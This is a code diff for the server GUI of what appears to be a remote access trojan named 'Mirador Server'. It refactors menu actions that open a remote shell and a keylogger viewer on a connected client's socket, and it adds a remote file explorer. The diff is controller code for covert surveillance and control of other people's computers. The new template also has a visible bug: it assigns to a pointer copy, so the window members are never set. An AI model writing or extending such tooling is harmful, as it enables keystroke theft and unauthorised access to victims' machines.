@@ -10,8 +10,9 @@ MainWindow::MainWindow(QWidget *parent)
     ui->setupUi(this);
 
     _actions = new QMenu;
-    _actions->addAction(QIcon(":/img/console-ico.png"), tr("Remote shell"), this, &MainWindow::openShell);
-    _actions->addAction(QIcon(":/img/keylog.png"), tr("Keylogger"), this, &MainWindow::getKeys);
+    _actions->addAction(QIcon(":/img/console-ico.png"), tr("Remote shell"), this, [this]{ this->openWindow<ClientShell>(this->_rem_sh); } );
+    _actions->addAction(QIcon(":/img/keylog.png"), tr("Keylogger"), this, [this]{ this->openWindow<Keylogs>(this->_out_keys); });
+    _actions->addAction(QIcon(":/img/folder.png"), tr("File explorer"), this, [this]{ this->openWindow<Explorer>(this->_explorer); });
 
     connect(ui->listenBut, &QPushButton::clicked, this, &MainWindow::listen);
 
@@ -19,27 +20,15 @@ MainWindow::MainWindow(QWidget *parent)
     connect(ui->listWidget, SIGNAL(customContextMenuRequested(QPoint)), this, SLOT(contextMenu(QPoint)));
 }
 
-void MainWindow::getKeys()
+template<typename T>
+void MainWindow::openWindow(T* var)
 {
     clearWindows();
-    if(_li != nullptr){
-        auto &item = ui->listWidget->selectedItems().at(0);
-        QTcpSocket* con = _li->getConnection(item);
-        //building window
-        _out_keys = new Keylogs{con, this};
-        _out_keys->show();
-    }
-}
-
-void MainWindow::openShell()
-{
-    clearWindows();
-    //get the tcpsocket
     if(_li != nullptr) {
         auto &item = ui->listWidget->selectedItems().at(0);
         QTcpSocket* con = _li->getConnection(item);
-        _rem_sh = new ClientShell(con, this);
-        _rem_sh->show();
+        var = new T(con, this);
+        var->show();
     }
 }
 
@@ -47,6 +36,7 @@ void MainWindow::clearWindows()
 {
     delete _rem_sh;
     delete _out_keys;
+    delete _explorer;
 }
 
 MainWindow::~MainWindow()
@@ -76,6 +66,7 @@ void MainWindow::listen()
 
         setWindowTitle(windowTitle() + tr(" - Listening"));
     } else {
+        clearWindows();
         ui->listenBut->setText(tr("Listen"));
         setWindowTitle("Mirador Server");
 
